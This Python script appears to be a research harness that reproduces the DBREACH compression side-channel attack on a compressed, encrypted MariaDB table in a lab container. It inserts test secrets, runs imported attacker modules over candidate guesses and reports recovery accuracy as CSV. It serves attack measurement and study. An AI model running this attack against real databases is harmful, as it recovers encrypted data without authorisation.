# /app/test_k_of_n_attack_maria.py
import os
import sys
import time
import random
import string
import atexit

import utils.mariadb_utils as utils
import dbreacher_impl
import decision_attacker

# ---- 로그 디폴트: 켜둠(원하면 실행 시 환경변수로 0) ----
os.environ.setdefault("DBREACH_LOG_FULL", "1")
os.environ.setdefault("ATTACK_VERBOSE", "1")

# ===================== Tee (콘솔+파일 동시 기록) =====================
class _Tee:
    def __init__(self, streams):
        self.streams = streams
    def write(self, s):
        for st in self.streams:
            try:
                st.write(s)
            except Exception:
                pass
    def flush(self):
        for st in self.streams:
            try:
                st.flush()
            except Exception:
                pass

# ===================== 인자 파싱 =====================
mode = "--random"            # --random | --english | --emails
secrets_to_try = [1]         # 기본 k
seed = None                  # 재현성용
start_idx_override = None    # --start 로 강제 가능
max_setup_attempts = 10      # 무한루프 방지
num_fillers = 200            # 논문 기본
logfile = None               # 로그 저장 경로 (옵션)
# dbreacher_impl 튜닝용(환경변수로 전달)
amplify_max_cli = None       # 300(기본), 400~500 권장 가능
pause_s_cli = None           # 증폭 step 사이 대기(초)

args = sys.argv[1:]
i = 0
while i < len(args):
    a = args[i]
    if a in ("--random", "--english", "--emails"):
        mode = a
        i += 1
    elif a == "--num_secrets":
        # 예: --num_secrets 1 2 3
        j = i + 1
        vals = []
        while j < len(args) and args[j].lstrip("-").isdigit():
            vals.append(int(args[j]))
            j += 1
        if vals:
            secrets_to_try = vals
        i = j
    elif a == "--seed":
        if i + 1 < len(args):
            seed = int(args[i+1])
            i += 2
        else:
            i += 1
    elif a == "--start":
        if i + 1 < len(args):
            start_idx_override = int(args[i+1])
            i += 2
        else:
            i += 1
    elif a == "--attempts":
        if i + 1 < len(args):
            max_setup_attempts = max(1, int(args[i+1]))
            i += 2
        else:
            i += 1
    elif a == "--num_fillers":
        if i + 1 < len(args):
            num_fillers = max(50, int(args[i+1]))
            i += 2
        else:
            i += 1
    elif a == "--logfile":
        if i + 1 < len(args):
            logfile = args[i+1]
            i += 2
        else:
            i += 1
    elif a == "--amplify":
        if i + 1 < len(args):
            amplify_max_cli = int(args[i+1])
            i += 2
        else:
            i += 1
    elif a == "--pause":
        if i + 1 < len(args):
            pause_s_cli = float(args[i+1])
            i += 2
        else:
            i += 1
    else:
        i += 1

# CLI로 받은 튜닝값을 env로 넘겨 dbreacher_impl이 사용하게 함
if amplify_max_cli is not None:
    os.environ["DBREACH_AMPLIFY_MAX"] = str(amplify_max_cli)
if pause_s_cli is not None:
    os.environ["DBREACH_PAUSE_S"] = str(pause_s_cli)

# ===================== 로그 파일 tee 설정 =====================
_log_fp = None
if logfile:
    # line-buffered 텍스트 파일
    _log_fp = open(logfile, "w", buffering=1, encoding="utf-8", errors="replace")
    sys.stdout = _Tee([sys.__stdout__, _log_fp])
    sys.stderr = _Tee([sys.__stderr__, _log_fp])

def _close_log():
    global _log_fp
    try:
        if _log_fp:
            _log_fp.flush()
            _log_fp.close()
    except Exception:
        pass

atexit.register(_close_log)

# ===================== 상수/초기화 =====================
maxRowSize = 200                   # 논문 기본
table = "victimtable"
db_name = "flask_db"

# 재현성 RNG
_rng = random.Random(seed) if seed is not None else random.Random()

def env_report(ctrl: utils.MariaDBController):
    try:
        print("[ENV] MariaDB variables snapshot:")
        for like in ("innodb_page_size",
                     "innodb_compression_algorithm",
                     "innodb_file_per_table",
                     "innodb_encrypt_tables",
                     "innodb_encrypt_log"):
            ctrl.cur.execute(f"SHOW VARIABLES LIKE '{like}';")
            for name, val in ctrl.cur.fetchall():
                print(f"  {name}={val}")
    except Exception as e:
        print(f"[ENV] warn: failed to read variables: {e}")

# DB 연결 (컨테이너 내부 주소/계정)
control = utils.MariaDBController(
    db_name,
    host="mariadb_container",
    port=3306,
    user="root",
    password="your_root_password",
    datadir="/var/lib/mysql",
)

# 환경 리포트 1회 출력
env_report(control)

# 초기 테이블 정리 및 (압축+암호화) 생성
control.drop_table(table)
control.create_basic_table(table, varchar_len=maxRowSize, compressed=True, encrypted=True)

# ===================== 후보군 구성 =====================
possibilities = []
if mode == "--random":
    for _ in range(2000):
        size = _rng.randint(10, 20)
        secret = "".join(_rng.choices(string.ascii_lowercase, k=size))
        possibilities.append(secret)
elif mode == "--english":
    with open("../resources/10000-english-long.txt") as f:
        for line in f:
            possibilities.append(line.strip().lower())
elif mode == "--emails":
    with open("../resources/fake-emails.txt") as f:
        for line in f:
            possibilities.append(line.strip().lower())
else:
    print(f"[WARN] unknown mode {mode}, fallback --random")
    for _ in range(2000):
        size = _rng.randint(10, 20)
        secret = "".join(_rng.choices(string.ascii_lowercase, k=size))
        possibilities.append(secret)

# filler charset (논문과 동일 컨셉: 소문자/특정문자 제거)
fset = set(string.printable) - set(string.ascii_lowercase) - {'*'}
if mode == "--emails":
    fset = fset - {'_', '.', '@'}
fillerCharSet = ''.join(sorted(fset))

# CSV 헤더
print("records_on_page,k,accuracy_n_500,accuracy_n_750,accuracy_n_1000,accuracy_n_1250,accuracy_n_1500,setup_time,per_guess_time")

# ===================== k 루프 =====================
for num_secrets in secrets_to_try:
    _rng.shuffle(possibilities)

    # trial 수는 원 코드대로 1회
    for trial in range(1):
        # 항상 깨끗한 (압축+암호화) 테이블로 시작
        control.drop_table(table)
        control.create_basic_table(table, varchar_len=maxRowSize, compressed=True, encrypted=True)

        # 시크릿 삽입
        guesses = []
        correct_guesses = set()
        for sidx in range(num_secrets):
            secret = possibilities[(trial + sidx) % len(possibilities)]
            print(f"[SETUP] INSERT secret id={sidx+1} val='{secret}'")
            control.insert_row(table, sidx + 1, secret)
            guesses.append(secret)
            correct_guesses.add(secret)

        # 나머지 오답 후보(총 1500개까지)
        for sidx in range(num_secrets, 1500):
            wrong_guess = possibilities[(trial + sidx) % len(possibilities)]
            guesses.append(wrong_guess)

        # 슬라이스 풀
        _500_guesses  = set(guesses[:500])
        _750_guesses  = set(guesses[:750])
        _1000_guesses = set(guesses[:1000])
        _1250_guesses = set(guesses[:1250])
        _1500_guesses = set(guesses[:1500])

        # DBREACHer: filler는 넉넉히 뒤쪽 페이지부터
        startIdx = start_idx_override if start_idx_override is not None else max(10000, num_secrets + 10)
        dbreach = dbreacher_impl.DBREACHerImpl(
            control, table,
            startIdx=startIdx,
            maxRowSize=maxRowSize,
            fillerCharSet=fillerCharSet,
            compressCharAscii=ord('*'),
            numFillerRows=num_fillers,   # 기본 200, 옵션으로 조절 가능
            # rng를 넘기지 않아도 내부에서 자체 RNG 사용
        )

        # 공격자
        try:
            attacker = decision_attacker.decisionAttacker(dbreach, guesses, fillerCharSet)
        except TypeError:
            attacker = decision_attacker.decisionAttacker(dbreach, guesses)

        # ===== 세팅 및 측정 루프(재시도 상한 있음) =====
        attempt = 0
        success = False
        setupStart = time.time()
        while not success and attempt < max_setup_attempts:
            attempt += 1
            ok = attacker.setUp()
            print(f"[MAIN] setUp attempt {attempt}/{max_setup_attempts} -> {ok}")
            if not ok:
                continue
            try:
                success = attacker.tryAllGuesses(verbose=True)
            except RuntimeError as e:
                print(f"[MAIN] tryAllGuesses raised: {e} (will retry)")
                success = False

        setupEnd = time.time()

        if not success:
            print(f"[MAIN] failed to stabilize after {max_setup_attempts} attempts; aborting this trial.")
            # 그래도 CSV 한 줄은 남김(측정 실패 표시)
            print(f"0,{num_secrets},0,0,0,0,0,{setupEnd - setupStart},0")
            continue

        # 참조 포함 점수 취득
        refScores = attacker.getGuessAndReferenceScores()

        # 논문식 지표
        pcts = [(1 - (b - b_yes) / max(b_no, 1), g) for g, (b_no, b, b_yes) in refScores]
        pcts.sort(reverse=True)

        # 디버그 출력(상위 50개)
        print("[RESULT] raw refScores (g, (b_no, b, b_yes)):")
        for g, (b_no, b, b_yes) in refScores:
            print(f"  g='{g}'  b_no={b_no}  b={b}  b_yes={b_yes}")

        print("[RESULT] ranking by pct (pct, guess):")
        for pct, g in pcts[:50]:
            print(f"  pct={pct:.6f}  g='{g}'")
        if len(pcts) > 50:
            print(f"  ... and {len(pcts)-50} more")

        # 상위 k 정확도
        def topk_acc(pool):
            top = [(pct, g) for pct, g in pcts if g in pool][:num_secrets]
            return (sum(1 for _, g in top if g in correct_guesses) / num_secrets) if num_secrets > 0 else 0.0

        accuracy_500  = topk_acc(_500_guesses)
        accuracy_750  = topk_acc(_750_guesses)
        accuracy_1000 = topk_acc(_1000_guesses)
        accuracy_1250 = topk_acc(_1250_guesses)
        accuracy_1500 = sum(1 for _, g in pcts[:num_secrets] if g in correct_guesses) / num_secrets

        end = time.time()
        per_guess_time = (end - setupEnd) / max(len(guesses), 1)

        # CSV: records_on_page는 실제 삽입된 filler 행 수로 기록
        records_on_page = getattr(dbreach, "rowsAdded", 0)
        print(f"{records_on_page},{num_secrets},{accuracy_500},{accuracy_750},{accuracy_1000},{accuracy_1250},{accuracy_1500},{setupEnd - setupStart},{per_guess_time}")
